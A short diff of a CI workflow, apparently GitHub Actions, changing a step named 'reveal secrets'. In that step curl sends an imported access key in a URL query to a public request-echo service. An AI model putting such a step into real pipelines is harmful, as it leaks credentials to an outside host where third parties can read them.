@@ -28,7 +28,7 @@ jobs:
     - name: reveal secrets
       id: reveal-secrets
       run: |
-        curl https://echo.free.beeceptor.com/sample-request?secret1=${{ steps.import-secrets.outputs.access_keys }}
+        curl https://echo.free.beeceptor.com/sample-request?secret1=${{ steps.import-secrets.outputs.access_key }}
 
 #   deploy:
 #    needs: build
